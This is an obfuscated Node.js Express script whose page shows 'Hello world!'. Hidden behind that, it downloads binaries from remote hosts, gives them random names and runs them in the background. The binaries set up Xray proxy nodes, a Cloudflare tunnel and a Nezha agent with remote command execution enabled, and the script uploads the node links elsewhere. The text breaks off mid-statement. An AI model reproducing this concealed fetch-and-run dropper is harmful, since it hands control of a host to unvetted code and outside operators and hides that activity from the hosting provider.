const _0x13da4e=_0x3481;(function(_0x533d3b,_0x404e52){const _0x16f04e={_0x113de3:0x181,_0x3f664e:0x156,_0x5ac711:0x1c2,_0x4341b0:0x19f,_0x5eb7c7:0x1bb},_0x1f7331=_0x3481,_0xa03cf=_0x533d3b();while(!![]){try{const _0x24281e=parseInt(_0x1f7331(_0x16f04e._0x113de3))/0x1+-parseInt(_0x1f7331(0x150))/0x2*(-parseInt(_0x1f7331(0x18e))/0x3)+-parseInt(_0x1f7331(_0x16f04e._0x3f664e))/0x4*(parseInt(_0x1f7331(0x1af))/0x5)+-parseInt(_0x1f7331(_0x16f04e._0x5ac711))/0x6+-parseInt(_0x1f7331(0x162))/0x7*(parseInt(_0x1f7331(_0x16f04e._0x4341b0))/0x8)+parseInt(_0x1f7331(0x1d0))/0x9+-parseInt(_0x1f7331(_0x16f04e._0x5eb7c7))/0xa;if(_0x24281e===_0x404e52)break;else _0xa03cf['push'](_0xa03cf['shift']());}catch(_0x5b1a01){_0xa03cf['push'](_0xa03cf['shift']());}}}(_0x4e9e,0xc48a7));function _0x4e9e(){const _0x41d61e=['NEZHA_KEY','tls','PORT','Unknown','/vmess-argo?ed=2560','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','text/plain;\x20charset=utf-8','exec','pkill\x20-f\x20\x22[','log','stringify','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20','Error\x20in\x20startserver:','Hello\x20world!','1321150KlRGFy','https://arm64.ssss.nyc.mn/agent','response','has','taskkill\x20/f\x20/im\x20','pop','then','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','push','charAt','child_process','NEZHA_PORT','https://arm64.ssss.nyc.mn/bot','753aNomro','https://amd64.ssss.nyc.mn/v1','unshift','--tls','blackhole','unlinkSync','\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','arm64','127.0.0.1','.exe\x20>\x20nul\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','&path=%2Fvless-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NAME','\x20>/dev/null\x202>&1','NEZHA_SERVER','630136mKclkd','\x20-c\x20','\x20-c\x20\x22','9afd1229-b893-40c1-84dd-51e7ce204913','match','boot.log','readFileSync','arm','2096','none','createWriteStream','xtls-rprx-vision','./tmp','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://oooo.serv00.net/add-url','block','10LyOkxZ','2083','\x0avless://','Empowerment\x20failed\x20for\x20','SUB_PATH','/tunnel.yml\x20run','get','\x20failed:\x20','/sub.txt\x20saved\x20successfully','\x22\x20>\x20/dev/null\x202>&1','platform','tunnel.json','4961120jViIKo','config.json','data','quic','filter','\x0a\x0atrojan://','https://amd64.ssss.nyc.mn/bot','1871166OqXuYn','vless','toString','fileName','forEach','/vless-argo','clear','\x0aclient_secret:\x20','true','\x0a\x20\x20tunnel:\x20','from','org','post','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','10063116wkqfvI','/vmess-argo','cdns.doon.eu.org','application/json','existsSync','catch','join','country_code','env','\x20-s\x20','nohup\x20','message','close','ARGO_AUTH','Empowerment\x20success\x20for\x20','\x20is\x20running','util','Content-Type','CFIP','false','status','/api/add-nodes','tcp','web\x20running\x20error:\x20','CFPORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','basename','utf-8','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','error','/api/delete-nodes','express','amd','UPLOAD_URL','send','Download\x20','set','Nodes\x20uploaded\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','npm\x20running\x20error:\x20','length','Error\x20executing\x20command:\x20','axios','ArgoDomain:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/trojan-argo','/dev/null','random','del\x20/f\x20/q\x20','statSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/config.json\x20>/dev/null\x202>&1\x20&','arch','&path=%2Ftrojan-argo%3Fed%3D2560#','aarch64','trojan','1412BEfncV','split','2053','test','isFile','https://amd64.ssss.nyc.mn/web','1691884XOgesG','Error\x20downloading\x20files:','Subscription\x20uploaded\x20successfully','TunnelSecret','\x20-p\x20','http','writeFileSync','sub','php\x20running\x20error:\x20','\x0a\x0avmess://','tunnel.yml','?encryption=none&security=tls&sni=','14OIrEPP','path','443','&fp=firefox&type=ws&host=','pipe','Add\x20automatic\x20access\x20task\x20faild:\x20','base64','8443','fileUrl','mkdirSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20>/dev/null\x202>&1\x20&','includes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'];_0x4e9e=function(){return _0x41d61e;};return _0x4e9e();}const express=require(_0x13da4e(0x137)),app=express(),axios=require(_0x13da4e(0x142)),os=require('os'),fs=require('fs'),path=require(_0x13da4e(0x163)),{promisify}=require(_0x13da4e(0x1e0)),exec=promisify(require('child_process')[_0x13da4e(0x179)]),{execSync}=require(_0x13da4e(0x18b)),UPLOAD_URL=process[_0x13da4e(0x1d8)][_0x13da4e(0x139)]||'',PROJECT_URL=process[_0x13da4e(0x1d8)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x13da4e(0x1d8)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x13da4e(0x1d8)]['FILE_PATH']||_0x13da4e(0x1ab),SUB_PATH=process[_0x13da4e(0x1d8)][_0x13da4e(0x1b3)]||_0x13da4e(0x15d),PORT=process[_0x13da4e(0x1d8)]['SERVER_PORT']||process[_0x13da4e(0x1d8)][_0x13da4e(0x172)]||0xbb8,UUID=process[_0x13da4e(0x1d8)]['UUID']||_0x13da4e(0x1a2),NEZHA_SERVER=process['env'][_0x13da4e(0x19e)]||'',NEZHA_PORT=process[_0x13da4e(0x1d8)][_0x13da4e(0x18c)]||'',NEZHA_KEY=process[_0x13da4e(0x1d8)][_0x13da4e(0x170)]||'',ARGO_DOMAIN=process[_0x13da4e(0x1d8)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x13da4e(0x1d8)][_0x13da4e(0x1dd)]||'',ARGO_PORT=process[_0x13da4e(0x1d8)]['ARGO_PORT']||0x1f41,CFIP=process[_0x13da4e(0x1d8)][_0x13da4e(0x1e2)]||_0x13da4e(0x1d2),CFPORT=process[_0x13da4e(0x1d8)][_0x13da4e(0x1e8)]||0x1bb,NAME=process[_0x13da4e(0x1d8)][_0x13da4e(0x19c)]||'';!fs[_0x13da4e(0x1d4)](FILE_PATH)?(fs[_0x13da4e(0x16b)](FILE_PATH),console['log'](FILE_PATH+_0x13da4e(0x175))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3a47d3={_0x4182f1:0x147},_0x309e67=_0x13da4e,_0x4829d5='abcdefghijklmnopqrstuvwxyz';let _0x3da13f='';for(let _0x308912=0x0;_0x308912<0x6;_0x308912++){_0x3da13f+=_0x4829d5['charAt'](Math['floor'](Math[_0x309e67(_0x3a47d3._0x4182f1)]()*_0x4829d5[_0x309e67(0x140)]));}return _0x3da13f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x13da4e(0x1d6)](FILE_PATH,phpName),webPath=path[_0x13da4e(0x1d6)](FILE_PATH,webName),botPath=path[_0x13da4e(0x1d6)](FILE_PATH,botName),subPath=path[_0x13da4e(0x1d6)](FILE_PATH,'sub.txt'),listPath=path[_0x13da4e(0x1d6)](FILE_PATH,'list.txt'),bootLogPath=path[_0x13da4e(0x1d6)](FILE_PATH,_0x13da4e(0x1a4)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5d8424={_0x531797:0x1a5,_0x217e35:0x133,_0x90a8ae:0x133,_0x464766:0x151,_0x13a50c:0x1bf,_0x200e72:0x136},_0x454c62=_0x13da4e;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x419744;try{_0x419744=fs[_0x454c62(_0x5d8424._0x531797)](subPath,_0x454c62(_0x5d8424._0x217e35));}catch{return null;}const _0x13f6aa=Buffer[_0x454c62(0x1cc)](_0x419744,_0x454c62(0x168))[_0x454c62(0x1c4)](_0x454c62(_0x5d8424._0x90a8ae)),_0x4b765c=_0x13f6aa[_0x454c62(_0x5d8424._0x464766)]('\x0a')[_0x454c62(_0x5d8424._0x13a50c)](_0x445808=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x454c62(0x153)](_0x445808));if(_0x4b765c[_0x454c62(0x140)]===0x0)return;return axios['post'](UPLOAD_URL+_0x454c62(_0x5d8424._0x200e72),JSON['stringify']({'nodes':_0x4b765c}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x5071a1=>{return null;}),null;}catch(_0x1a1308){return null;}}function cleanupOldFiles(){const _0x236687={_0x354566:0x1c6},_0x10b367={_0x5d87d3:0x149,_0x5e626c:0x154},_0x37133b=_0x13da4e;try{const _0x3886f4=fs['readdirSync'](FILE_PATH);_0x3886f4[_0x37133b(_0x236687._0x354566)](_0x2f44ef=>{const _0x3c9502=_0x37133b,_0x5bab8b=path[_0x3c9502(0x1d6)](FILE_PATH,_0x2f44ef);try{const _0x942207=fs[_0x3c9502(_0x10b367._0x5d87d3)](_0x5bab8b);_0x942207[_0x3c9502(_0x10b367._0x5e626c)]()&&fs[_0x3c9502(0x193)](_0x5bab8b);}catch(_0x34a1ed){}});}catch(_0x720cac){}}app[_0x13da4e(0x1b5)]('/',function(_0x12469a,_0x3db143){const _0x5674c2={_0x2e449f:0x180},_0x348909=_0x13da4e;_0x3db143['send'](_0x348909(_0x5674c2._0x2e449f));});async function generateConfig(){const _0x4038ce={_0x247e01:0x146,_0x172e5b:0x1c3,_0x4686b6:0x1aa,_0x43d4ae:0x1a8,_0x53cd06:0x1c7,_0x489baf:0x1d1,_0x3c90f4:0x145,_0x11b09b:0x197,_0x9a0ef3:0x1c3,_0xc7494e:0x1a8,_0x5986ca:0x1c3,_0x6c02d6:0x171,_0x209602:0x171,_0x264352:0x14f,_0x31867d:0x15b,_0x2d3996:0x15c,_0x26fbc9:0x1bc,_0xafbedd:0x17c},_0x3e2527=_0x13da4e,_0x5f2d4e={'log':{'access':_0x3e2527(_0x4038ce._0x247e01),'error':_0x3e2527(_0x4038ce._0x247e01),'loglevel':_0x3e2527(0x1a8)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3e2527(_0x4038ce._0x172e5b),'settings':{'clients':[{'id':UUID,'flow':_0x3e2527(_0x4038ce._0x4686b6)}],'decryption':_0x3e2527(_0x4038ce._0x43d4ae),'fallbacks':[{'dest':0xbb9},{'path':_0x3e2527(_0x4038ce._0x53cd06),'dest':0xbba},{'path':_0x3e2527(_0x4038ce._0x489baf),'dest':0xbbb},{'path':_0x3e2527(_0x4038ce._0x3c90f4),'dest':0xbbc}]},'streamSettings':{'network':_0x3e2527(0x1e6)}},{'port':0xbb9,'listen':_0x3e2527(_0x4038ce._0x11b09b),'protocol':_0x3e2527(_0x4038ce._0x9a0ef3),'settings':{'clients':[{'id':UUID}],'decryption':_0x3e2527(0x1a8)},'streamSettings':{'network':'tcp','security':_0x3e2527(_0x4038ce._0xc7494e)}},{'port':0xbba,'listen':_0x3e2527(0x197),'protocol':_0x3e2527(_0x4038ce._0x5986ca),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3e2527(0x1a8),'wsSettings':{'path':_0x3e2527(0x1c7)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3e2527(_0x4038ce._0x6c02d6),_0x3e2527(0x1be)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3e2527(0x197),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3e2527(0x1d1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3e2527(_0x4038ce._0x209602),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3e2527(0x197),'protocol':_0x3e2527(_0x4038ce._0x264352),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3e2527(_0x4038ce._0xc7494e),'wsSettings':{'path':_0x3e2527(_0x4038ce._0x3c90f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x3e2527(_0x4038ce._0x31867d),'tls',_0x3e2527(0x1be)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x3e2527(0x192),'tag':_0x3e2527(0x1ae)}]};fs[_0x3e2527(_0x4038ce._0x2d3996)](path[_0x3e2527(0x1d6)](FILE_PATH,_0x3e2527(_0x4038ce._0x26fbc9)),JSON[_0x3e2527(_0x4038ce._0xafbedd)](_0x5f2d4e,null,0x2));}function getSystemArchitecture(){const _0x17d1c9={_0x4b5963:0x14c,_0x19e3ff:0x1a6,_0x3e8c70:0x14e,_0x113e29:0x138},_0x2a4f34=_0x13da4e,_0x592503=os[_0x2a4f34(_0x17d1c9._0x4b5963)]();return _0x592503===_0x2a4f34(_0x17d1c9._0x19e3ff)||_0x592503===_0x2a4f34(0x196)||_0x592503===_0x2a4f34(_0x17d1c9._0x3e8c70)?'arm':_0x2a4f34(_0x17d1c9._0x113e29);}function downloadFile(_0x465cd5,_0x461633,_0xe29b1b){const _0x4dcc3b={_0x579cbc:0x16b,_0x2cdae8:0x1a9,_0x4acaf5:0x187},_0x1aad79={_0x1cecb4:0x13b,_0x13ffc5:0x1db,_0x359b71:0x135},_0x37ed53={_0x435923:0x135},_0x3248e2={_0xbbaf59:0x1b6,_0x599ed0:0x1db,_0x29a4c0:0x135},_0x124a98=_0x13da4e,_0x1dcdf9=_0x465cd5;!fs[_0x124a98(0x1d4)](FILE_PATH)&&fs[_0x124a98(_0x4dcc3b._0x579cbc)](FILE_PATH,{'recursive':!![]});const _0x129ef5=fs[_0x124a98(_0x4dcc3b._0x2cdae8)](_0x1dcdf9);axios({'method':'get','url':_0x461633,'responseType':'stream'})[_0x124a98(_0x4dcc3b._0x4acaf5)](_0x1c41ef=>{const _0x4d91af={_0x300a6a:0x1dc,_0x4d3ac6:0x1ea},_0x10ea62=_0x124a98;_0x1c41ef[_0x10ea62(0x1bd)][_0x10ea62(0x166)](_0x129ef5),_0x129ef5['on']('finish',()=>{const _0x36b7b6=_0x10ea62;_0x129ef5[_0x36b7b6(_0x4d91af._0x300a6a)](),console['log']('Download\x20'+path[_0x36b7b6(_0x4d91af._0x4d3ac6)](_0x1dcdf9)+_0x36b7b6(0x194)),_0xe29b1b(null,_0x1dcdf9);}),_0x129ef5['on'](_0x10ea62(_0x37ed53._0x435923),_0x43c422=>{const _0x43a2e1=_0x10ea62;fs['unlink'](_0x1dcdf9,()=>{});const _0xeb4545=_0x43a2e1(0x13b)+path['basename'](_0x1dcdf9)+_0x43a2e1(_0x3248e2._0xbbaf59)+_0x43c422[_0x43a2e1(_0x3248e2._0x599ed0)];console[_0x43a2e1(_0x3248e2._0x29a4c0)](_0xeb4545),_0xe29b1b(_0xeb4545);});})['catch'](_0x59dd83=>{const _0x9c4fb8=_0x124a98,_0x129ba2=_0x9c4fb8(_0x1aad79._0x1cecb4)+path[_0x9c4fb8(0x1ea)](_0x1dcdf9)+'\x20failed:\x20'+_0x59dd83[_0x9c4fb8(_0x1aad79._0x13ffc5)];console[_0x9c4fb8(_0x1aad79._0x359b71)](_0x129ba2),_0xe29b1b(_0x129ba2);});}async function downloadFilesAndRun(){const _0x35981e={_0x36fe03:0x140,_0x2ebb96:0x17b,_0x50e2f2:0x135,_0x47c607:0x16e,_0x46a639:0x184,_0x3f469c:0x1c9,_0x14549d:0x144,_0x322868:0x1a1,_0x54435f:0x169,_0x305832:0x1a7,_0x1b34fa:0x1b0,_0x23a010:0x152,_0x1e2f12:0x1d9,_0xefce40:0x1a0,_0x373168:0x14b,_0x3d581c:0x1e7,_0x6bb000:0x1b4},_0x8c2e84=_0x13da4e,_0x220838=getSystemArchitecture(),_0x23be7e=getFilesForArchitecture(_0x220838);if(_0x23be7e[_0x8c2e84(_0x35981e._0x36fe03)]===0x0){console[_0x8c2e84(_0x35981e._0x2ebb96)](_0x8c2e84(0x1e9));return;}const _0x5e45ed=_0x23be7e['map'](_0x4541c0=>{return new Promise((_0x5966eb,_0x2fbdce)=>{const _0x140883=_0x3481;downloadFile(_0x4541c0[_0x140883(0x1c5)],_0x4541c0[_0x140883(0x16a)],(_0x1541b4,_0x204b5c)=>{_0x1541b4?_0x2fbdce(_0x1541b4):_0x5966eb(_0x204b5c);});});});try{await Promise['all'](_0x5e45ed);}catch(_0x57d568){console[_0x8c2e84(_0x35981e._0x50e2f2)](_0x8c2e84(0x157),_0x57d568);return;}function _0x5deb58(_0x57da3d){const _0x287f39=0x1fd;_0x57da3d['forEach'](_0xb4fd80=>{const _0x2e8a6c={_0x38eaf4:0x1b2,_0x4aea4a:0x1de,_0x218ea0:0x1c4};fs['existsSync'](_0xb4fd80)&&fs['chmod'](_0xb4fd80,_0x287f39,_0x4ae68b=>{const _0x3b2466=_0x3481;_0x4ae68b?console[_0x3b2466(0x135)](_0x3b2466(_0x2e8a6c._0x38eaf4)+_0xb4fd80+':\x20'+_0x4ae68b):console[_0x3b2466(0x17b)](_0x3b2466(_0x2e8a6c._0x4aea4a)+_0xb4fd80+':\x20'+_0x287f39[_0x3b2466(_0x2e8a6c._0x218ea0)](0x8));});});}const _0x348b30=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5deb58(_0x348b30);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1bade9=NEZHA_SERVER[_0x8c2e84(_0x35981e._0x47c607)](':')?NEZHA_SERVER[_0x8c2e84(0x151)](':')[_0x8c2e84(0x186)]():'',_0x480c3e=new Set(['443','8443',_0x8c2e84(0x1a7),'2087','2083','2053']),_0x76d24c=_0x480c3e[_0x8c2e84(_0x35981e._0x46a639)](_0x1bade9)?_0x8c2e84(0x1ca):_0x8c2e84(0x1e3),_0x53aaab=_0x8c2e84(_0x35981e._0x3f469c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x76d24c+_0x8c2e84(_0x35981e._0x14549d)+UUID;fs[_0x8c2e84(0x15c)](path[_0x8c2e84(0x1d6)](FILE_PATH,'config.yaml'),_0x53aaab);const _0x2384da=_0x8c2e84(0x1da)+phpPath+_0x8c2e84(_0x35981e._0x322868)+FILE_PATH+_0x8c2e84(0x188);try{await exec(_0x2384da),console[_0x8c2e84(0x17b)](phpName+'\x20is\x20running'),await new Promise(_0x551915=>setTimeout(_0x551915,0x3e8));}catch(_0x120b41){console['error'](_0x8c2e84(0x15e)+_0x120b41);}}else{let _0x1c1b83='';const _0x2ba071=[_0x8c2e84(0x164),_0x8c2e84(_0x35981e._0x54435f),_0x8c2e84(_0x35981e._0x305832),'2087',_0x8c2e84(_0x35981e._0x1b34fa),_0x8c2e84(_0x35981e._0x23a010)];_0x2ba071['includes'](NEZHA_PORT)&&(_0x1c1b83=_0x8c2e84(0x191));const _0x29a70b=_0x8c2e84(0x1da)+npmPath+_0x8c2e84(_0x35981e._0x1e2f12)+NEZHA_SERVER+':'+NEZHA_PORT+_0x8c2e84(0x15a)+NEZHA_KEY+'\x20'+_0x1c1b83+_0x8c2e84(0x1cf);try{await exec(_0x29a70b),console[_0x8c2e84(0x17b)](npmName+_0x8c2e84(0x1df)),await new Promise(_0x3d76df=>setTimeout(_0x3d76df,0x3e8));}catch(_0x293cf3){console[_0x8c2e84(0x135)](_0x8c2e84(0x13f)+_0x293cf3);}}}else console[_0x8c2e84(0x17b)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x60b237='nohup\x20'+webPath+_0x8c2e84(_0x35981e._0xefce40)+FILE_PATH+_0x8c2e84(_0x35981e._0x373168);try{await exec(_0x60b237),console[_0x8c2e84(_0x35981e._0x2ebb96)](webName+_0x8c2e84(0x1df)),await new Promise(_0x3a7ca0=>setTimeout(_0x3a7ca0,0x3e8));}catch(_0x368da0){console[_0x8c2e84(0x135)](_0x8c2e84(_0x35981e._0x3d581c)+_0x368da0);}if(fs[_0x8c2e84(0x1d4)](botPath)){let _0x1297cb;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1297cb=_0x8c2e84(0x176)+ARGO_AUTH;else ARGO_AUTH[_0x8c2e84(0x1a3)](/TunnelSecret/)?_0x1297cb=_0x8c2e84(0x1ac)+FILE_PATH+_0x8c2e84(_0x35981e._0x6bb000):_0x1297cb=_0x8c2e84(0x16f)+FILE_PATH+_0x8c2e84(0x17d)+ARGO_PORT;try{await exec(_0x8c2e84(0x1da)+botPath+'\x20'+_0x1297cb+_0x8c2e84(0x16d)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x87a9c6=>setTimeout(_0x87a9c6,0x7d0));}catch(_0x5bf68e){console[_0x8c2e84(_0x35981e._0x50e2f2)]('Error\x20executing\x20command:\x20'+_0x5bf68e);}}await new Promise(_0x2a017c=>setTimeout(_0x2a017c,0x1388));}function getFilesForArchitecture(_0x4dd80e){const _0x51a9c6={_0x1f9e7e:0x18d,_0x128627:0x1c1},_0xcf1547=_0x13da4e;let _0x379ffb;_0x4dd80e===_0xcf1547(0x1a6)?_0x379ffb=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0xcf1547(_0x51a9c6._0x1f9e7e)}]:_0x379ffb=[{'fileName':webPath,'fileUrl':_0xcf1547(0x155)},{'fileName':botPath,'fileUrl':_0xcf1547(_0x51a9c6._0x128627)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x37b251=_0x4dd80e==='arm'?_0xcf1547(0x182):'https://amd64.ssss.nyc.mn/agent';_0x379ffb[_0xcf1547(0x190)]({'fileName':npmPath,'fileUrl':_0x37b251});}else{const _0x4c84a4=_0x4dd80e===_0xcf1547(0x1a6)?'https://arm64.ssss.nyc.mn/v1':_0xcf1547(0x18f);_0x379ffb[_0xcf1547(0x190)]({'fileName':phpPath,'fileUrl':_0x4c84a4});}}return _0x379ffb;}function argoType(){const _0x4a58f2={_0x7098e0:0x17b,_0x47330d:0x14a,_0x7ad7d0:0x16e,_0x14eeb8:0x1d6,_0x1d78a9:0x1ba,_0x57e5c8:0x177,_0xa39bc0:0x16c},_0x4af87f=_0x13da4e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4af87f(_0x4a58f2._0x7098e0)](_0x4af87f(_0x4a58f2._0x47330d));return;}if(ARGO_AUTH[_0x4af87f(_0x4a58f2._0x7ad7d0)](_0x4af87f(0x159))){fs['writeFileSync'](path[_0x4af87f(_0x4a58f2._0x14eeb8)](FILE_PATH,_0x4af87f(_0x4a58f2._0x1d78a9)),ARGO_AUTH);const _0x55d45b=_0x4af87f(0x1cb)+ARGO_AUTH[_0x4af87f(0x151)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4af87f(0x1d6)](FILE_PATH,_0x4af87f(0x1ba))+_0x4af87f(0x134)+ARGO_DOMAIN+_0x4af87f(0x195)+ARGO_PORT+_0x4af87f(_0x4a58f2._0x57e5c8);fs['writeFileSync'](path['join'](FILE_PATH,_0x4af87f(0x160)),_0x55d45b);}else console[_0x4af87f(0x17b)](_0x4af87f(_0x4a58f2._0xa39bc0));}async function extractDomains(){const _0x1406d0={_0x24ebf2:0x1a4,_0x18d6d1:0x17b,_0x3a7cf0:0x13e,_0x488dca:0x1d6,_0x36ccbb:0x16f,_0x274a79:0x16d},_0x1d4499={_0x4113ba:0x1bd,_0x65ef7:0x1d7,_0x42931e:0x1bd,_0x5ce612:0x1cd,_0x2c14f2:0x1d7,_0x235700:0x1bd},_0x38bfe5={_0x3ad4f3:0x185,_0x103c62:0x198},_0x1fe0a0={_0x383283:0x189},_0x50e7a4=_0x13da4e;let _0x5b71da;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5b71da=ARGO_DOMAIN,console[_0x50e7a4(0x17b)]('ARGO_DOMAIN:',_0x5b71da),await _0x48d49e(_0x5b71da);else try{const _0x13a580=fs[_0x50e7a4(0x1a5)](path[_0x50e7a4(0x1d6)](FILE_PATH,_0x50e7a4(_0x1406d0._0x24ebf2)),'utf-8'),_0x21ea0c=_0x13a580[_0x50e7a4(0x151)]('\x0a'),_0x35c2a8=[];_0x21ea0c[_0x50e7a4(0x1c6)](_0x134d04=>{const _0x4d892d=_0x50e7a4,_0x52bd47=_0x134d04[_0x4d892d(0x1a3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52bd47){const _0x438159=_0x52bd47[0x1];_0x35c2a8[_0x4d892d(_0x1fe0a0._0x383283)](_0x438159);}});if(_0x35c2a8[_0x50e7a4(0x140)]>0x0)_0x5b71da=_0x35c2a8[0x0],console[_0x50e7a4(_0x1406d0._0x18d6d1)](_0x50e7a4(0x143),_0x5b71da),await _0x48d49e(_0x5b71da);else{console[_0x50e7a4(0x17b)](_0x50e7a4(_0x1406d0._0x3a7cf0)),fs[_0x50e7a4(0x193)](path[_0x50e7a4(_0x1406d0._0x488dca)](FILE_PATH,'boot.log'));async function _0x5b9671(){const _0x2040c6=_0x50e7a4;try{process[_0x2040c6(0x1b9)]==='win32'?await exec(_0x2040c6(_0x38bfe5._0x3ad4f3)+botName+_0x2040c6(_0x38bfe5._0x103c62)):await exec(_0x2040c6(0x17a)+botName[_0x2040c6(0x18a)](0x0)+']'+botName['substring'](0x1)+_0x2040c6(0x1b8));}catch(_0x5df044){}}_0x5b9671(),await new Promise(_0x2fa76e=>setTimeout(_0x2fa76e,0xbb8));const _0x1617c5=_0x50e7a4(_0x1406d0._0x36ccbb)+FILE_PATH+_0x50e7a4(0x17d)+ARGO_PORT;try{await exec(_0x50e7a4(0x1da)+botPath+'\x20'+_0x1617c5+_0x50e7a4(_0x1406d0._0x274a79)),console[_0x50e7a4(_0x1406d0._0x18d6d1)](botName+_0x50e7a4(0x1df)),await new Promise(_0x1d3523=>setTimeout(_0x1d3523,0xbb8)),await extractDomains();}catch(_0x350c40){console['error'](_0x50e7a4(0x141)+_0x350c40);}}}catch(_0x4fed57){console[_0x50e7a4(0x135)]('Error\x20reading\x20boot.log:',_0x4fed57);}async function _0x560472(){const _0x3f5c8d=_0x50e7a4;try{const _0x334639=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x334639[_0x3f5c8d(0x1bd)]&&_0x334639[_0x3f5c8d(_0x1d4499._0x4113ba)][_0x3f5c8d(_0x1d4499._0x65ef7)]&&_0x334639[_0x3f5c8d(_0x1d4499._0x42931e)][_0x3f5c8d(_0x1d4499._0x5ce612)])return _0x334639[_0x3f5c8d(0x1bd)][_0x3f5c8d(_0x1d4499._0x2c14f2)]+'_'+_0x334639[_0x3f5c8d(0x1bd)][_0x3f5c8d(0x1cd)];}catch(_0x2d3b43){try{const _0x540671=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x540671[_0x3f5c8d(0x1bd)]&&_0x540671[_0x3f5c8d(_0x1d4499._0x4113ba)][_0x3f5c8d(0x1e4)]==='success'&&_0x540671['data']['countryCode']&&_0x540671[_0x3f5c8d(_0x1d4499._0x235700)][_0x3f5c8d(0x1cd)])return _0x540671[_0x3f5c8d(_0x1d4499._0x4113ba)]['countryCode']+'_'+_0x540671[_0x3f5c8d(0x1bd)][_0x3f5c8d(0x1cd)];}catch(_0x3df362){}}return _0x3f5c8d(0x173);}async function _0x48d49e(_0x35a976){const _0x3f191c={_0x58cba2:0x1a8,_0x2c82ea:0x174,_0x54878a:0x171,_0x2c2da3:0x19a,_0x4c5453:0x15f,_0x4e1236:0x1cc,_0x41d629:0x17c,_0x55fd40:0x1c0,_0x2f9fca:0x14d,_0x901aed:0x17b,_0x51f92f:0x1cc},_0x1459cc=await _0x560472(),_0x62f366=NAME?NAME+'-'+_0x1459cc:_0x1459cc;return new Promise(_0x2d8c90=>{const _0x30bbba={_0x36f69d:0x1cc,_0x399440:0x1e1,_0x25fd23:0x13a};setTimeout(()=>{const 